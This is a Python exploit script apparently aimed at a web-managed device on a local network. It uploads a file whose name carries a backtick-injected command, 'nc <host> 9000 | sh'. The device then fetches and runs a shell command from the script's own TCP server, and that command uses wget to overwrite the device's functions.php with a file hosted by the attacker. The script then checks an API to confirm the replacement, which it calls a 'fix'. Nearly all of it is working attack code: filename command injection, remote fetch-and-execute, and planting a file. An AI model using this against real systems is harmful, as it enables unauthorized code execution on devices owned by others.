import requests
import time
import threading
import http.server
import socketserver
import socket
import os
import sys

TARGET_IP = "192.168.1.173"
UPLOAD_URL = f"http://{TARGET_IP}/api/index.php?url=update-file-upload"
CHECK_URL = f"http://{TARGET_IP}/api/tlc/1"
LOCAL_IP = "192.168.1.11"
HTTP_PORT = 8000
TCP_PORT = 9000
PAYLOAD_DIR = "payload"

class QuietHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

requested_file = False

class RequestHandler(QuietHandler):
    def do_GET(self):
        global requested_file
        if "functions.php" in self.path:
            print(f"[+] HTTP Server: Device requested functions.php from {self.client_address[0]}")
            requested_file = True
        super().do_GET()

def start_http_server():
    if not os.path.exists(PAYLOAD_DIR):
        os.makedirs(PAYLOAD_DIR)
    os.chdir(PAYLOAD_DIR)
    with socketserver.TCPServer(("", HTTP_PORT), RequestHandler) as httpd:
        print(f"[+] HTTP Server started at http://{LOCAL_IP}:{HTTP_PORT}")
        httpd.serve_forever()

def start_tcp_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("", TCP_PORT))
    server_socket.listen(1)
    print(f"[+] TCP Server listening on {LOCAL_IP}:{TCP_PORT}")
    
    conn, addr = server_socket.accept()
    print(f"[+] TCP Connection from {addr}")
    
    # Send the script
    script = f"wget -O /www/inc/functions.php http://{LOCAL_IP}:{HTTP_PORT}/functions.php\n"
    conn.sendall(script.encode())
    conn.close()
    server_socket.close()

def exploit():
    # Start TCP server in background
    tcp_thread = threading.Thread(target=start_tcp_server, daemon=True)
    tcp_thread.start()
    
    # Payload: nc LOCAL_IP TCP_PORT | sh
    # No slashes!
    # Use backticks to force execution during argument expansion
    cmd = f"nc {LOCAL_IP} {TCP_PORT} | sh"
    
    # Filename injection: "x`cmd`"
    filename = f"x`{cmd}`"
    
    print(f"[+] Malicious filename: {filename}")
    
    files = {
        'file': (filename, b'dummy content', 'application/octet-stream')
    }
    
    print(f"[+] Uploading to {UPLOAD_URL}")
    try:
        r = requests.post(UPLOAD_URL, files=files, timeout=20)
        print(f"[+] Upload status: {r.status_code}")
    except Exception as e:
        print(f"[-] Upload failed: {e}")
        return

    print("[+] Waiting for device to fetch payload...")
    for i in range(10):
        if requested_file:
            print("[+] SUCCESS: Device requested functions.php!")
            break
        time.sleep(1)
    
    if not requested_file:
        print("[-] Warning: Device did not request functions.php via HTTP.")
    
    print("[+] Verifying fix via API...")
    try:
        response = requests.get(CHECK_URL, timeout=10)
        if response.status_code == 200:
            try:
                data = response.json()
                if isinstance(data, list) and len(data) > 0:
                    data = data[0]
                
                ip = data.get('ip')
                print(f"[+] API Response IP: {ip}")
                if ip and ip != "1.1.1.1":
                    print("[+] VERIFICATION SUCCESS: IP is correctly reported!")
                else:
                    print("[-] VERIFICATION FAILED: IP is still 1.1.1.1.")
            except:
                print(f"[-] Failed to parse JSON: {response.text[:100]}")
        else:
            print(f"[-] API check failed: Status {response.status_code}")
    except Exception as e:
        print(f"[-] API check failed: {e}")

if __name__ == "__main__":
    # Start HTTP server in background
    http_thread = threading.Thread(target=start_http_server, daemon=True)
    http_thread.start()
    
    # Give server a moment to start
    time.sleep(2)
    
    exploit()
